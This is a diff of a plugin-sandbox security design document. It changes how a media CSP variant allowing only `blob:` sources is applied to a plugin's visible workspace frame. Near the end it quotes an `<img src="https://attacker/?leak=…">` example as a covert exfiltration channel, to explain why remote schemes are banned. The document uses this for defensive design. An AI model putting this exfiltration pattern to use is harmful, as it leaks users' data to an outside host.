@@ -104,10 +104,12 @@ we already intended to enforce; both are closed.
 
 Qualitative coding of audio/image/video must **render** media inside the coding
 workspace, but the strict plugin CSP (`default-src 'none'`) blocks every `<audio>`/
-`<video>`/`<img>` source. A dedicated sandbox variant (`plugin-host-media.html`,
-selected only for plugins that declare `manifest.media === true`, exactly like the
-codec host is selected by `manifest.codecs`) widens the CSP by **two directives
-only**: `media-src blob:` and `img-src blob:`.
+`<video>`/`<img>` source. A dedicated CSP **variant** — the single sandbox template
+(`plugin-host.html`) with its CSP swapped at load time by `core/plugin-sandbox.js`,
+selected for plugins that declare `manifest.media === true`, exactly like the codec
+CSP is selected by `manifest.codecs` — widens the policy by **two directives only**:
+`media-src blob:` and `img-src blob:`. Only the plugin's *visible workspace* frame
+gets it (that is the one that renders); its hidden compute frame stays strict.
 
 - **`blob:` only — never `https:`/`data:` in those directives.** `<img src="https://
   attacker/?leak=…">` is a covert-GET exfiltration channel; allowing a remote scheme
